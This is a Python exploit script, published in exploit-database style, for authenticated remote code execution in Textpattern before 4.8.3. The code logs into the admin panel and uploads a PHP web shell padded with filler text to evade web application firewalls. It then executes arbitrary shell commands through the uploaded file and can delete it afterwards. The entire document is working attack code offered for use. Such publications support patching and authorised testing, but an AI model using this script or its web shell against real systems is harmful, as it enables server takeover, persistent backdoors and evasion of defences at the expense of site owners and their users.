# Exploit Title: Textpattern 4.8.3 - Remote code execution (Authenticated) (2)
# Date: 03/03/2021
# Exploit Author: Ricardo Ruiz (@ricardojoserf)
# Vendor Homepage: https://textpattern.com/
# Software Link: https://textpattern.com/start
# Version: Previous to 4.8.3
# Tested on: CentOS, textpattern 4.5.7 and 4.6.0
# Install dependencies: pip3 install beautifulsoup4 argparse requests
# Example: python3 exploit.py -t http://example.com/ -u USER -p PASSWORD -c "whoami" -d

import sys
import argparse
import requests
from bs4 import BeautifulSoup


def get_args():
	parser = argparse.ArgumentParser()
	parser.add_argument('-t', '--target', required=True, action='store', help='Target url')
	parser.add_argument('-u', '--user', required=True, action='store', help='Username')
	parser.add_argument('-p', '--password', required=True, action='store', help='Password')
	parser.add_argument('-c', '--command', required=False, default="whoami", action='store', help='Command to execute')
	parser.add_argument('-f', '--filename', required=False, default="testing.php", action='store', help='PHP File Name to upload')
	parser.add_argument('-d', '--delete', required=False, default=False, action='store_true', help='Delete PHP file after executing command')
	my_args = parser.parse_args()
	return my_args


def get_file_id(s, files_url, file_name):
	r = s.get(files_url, verify=False)
	soup = BeautifulSoup(r.text, "html.parser")
	for a in soup.findAll('a'):
		if "file_download/" in a['href']:
			file_id_name = a['href'].split('file_download/')[1].split("/")
			if file_id_name[1] == file_name:
				file_id = file_id_name[0]
				return file_id


def login(login_url, user, password):
	s = requests.Session()
	s.get(login_url, verify=False)
	data = {"p_userid":user, "p_password":password, "_txp_token":""}
	r = s.post(login_url, data=data, verify=False)
	if str(r.status_code) == "401":
		print("[+] Invalid credentials")
		sys.exit(0)
	_txp_token = ""
	soup = BeautifulSoup(r.text, "html.parser")
	fields = soup.findAll('input')
	for f in fields:
		if (f['name'] == "_txp_token"):
			_txp_token = f['value']
	return s,_txp_token


def upload(s, login_url, _txp_token, file_name):
	php_payload = '<a>Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed eiusmod tempor incidunt ut labore et dolore magna aliqua.</a>\n'*1000 # to avoid WAF problems
	php_payload += '<?php $test = shell_exec($_REQUEST[\'cmd\']); echo $test; ?>'
	s.post(login_url, files=(("MAX_FILE_SIZE", (None, "2000000")), ("event", (None, "file")), ("step", (None, "file_insert")), ("id", (None, "")), ("sort", (None, "")), ("dir", (None, "")), ("page", (None, "")), ("search_method", (None, "")), ("crit", (None, "")), ("thefile",(file_name, php_payload, 'application/octet-stream')), ("_txp_token", (None, _txp_token)),), verify=False)


def exec_cmd(s, cmd_url, command):
	r = s.get(cmd_url+command, verify=False)
	response = r.text.replace("<a>Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed eiusmod tempor incidunt ut labore et dolore magna aliqua.</a>\n","")
	return response


def delete_file(s, login_url, file_id, _txp_token):
	data = {"selected[]":file_id,"edit_method":"delete","event":"file","step":"file_multi_edit","page":"1","sort":"filename","dir":"asc","_txp_token":_txp_token}
	s.post(login_url, data=data, verify=False)


def main():
	args = get_args()
	url = args.target
	user = args.user
	password = args.password
	file_name = args.filename
	command = args.command
	delete_after_execute = args.delete

	login_url =  url + "/textpattern/index.php"
	upload_url = url + "/textpattern/index.php"
	cmd_url =    url + "/files/" + file_name + "?cmd="
	files_url =  url + "/textpattern/index.php?event=file"

	s,_txp_token = login(login_url, user, password)
	print("[+] Logged in")
	upload(s, login_url, _txp_token, file_name)
	file_id = get_file_id(s, files_url, file_name)
	print("[+] File uploaded with id %s"%(file_id))
	response = exec_cmd(s, cmd_url, command)
	print("[+] Command output \n%s"%(response))

	if delete_after_execute:
		print("[+] Deleting uploaded file %s with id %s" %(file_name, file_id))
		delete_file(s, login_url, file_id, _txp_token)
	else:
		print("[+] File not deleted. Url: %s"%(url + "/files/" + file_name))


if __name__ == "__main__":
	main()